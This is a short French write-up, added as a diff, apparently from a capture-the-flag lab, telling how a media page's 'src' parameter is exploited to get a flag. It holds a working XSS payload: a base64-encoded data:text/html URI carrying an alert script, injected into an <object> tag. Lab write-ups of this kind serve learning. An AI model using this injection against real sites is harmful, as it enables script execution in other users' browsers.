@@ -1,0 +1,20 @@
+Sur la page d'accueil une image est cliquable, celle de la nsa,
+qui nous amène à la page http://192.168.165.84/index.php?page=media&src=nsa
+
+Nous voyons dans les paramètres url src=nsa, ce qui nous indique que nous pouvons changer la source de l'image
+
+On peut essayer quelques url, notamment http://192.168.165.84/index.php?page=media&src=admin, mais rien ne marche.
+
+En inspectant la page, nous voyons que l'image est dans un tag <object>
+
+Une rapide recherche sur internet nous amène sur ce ticket Bugzilla,
+https://bugzilla.mozilla.org/show_bug.cgi?id=530308
+qui nous donne simplement la solution:
+
+Nous pouvons mettre un script a la place de l'image, en l'encodant en base64:
+
+<script>alert("coucou")</script> encodé en base64 donne PHNjcmlwdD5hbGVydCgiY291Y291Iik8L3NjcmlwdD4=
+
+Essayons donc http://192.168.165.84/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiY291Y291Iik8L3NjcmlwdD4=
+
+Qui nous donne le flag
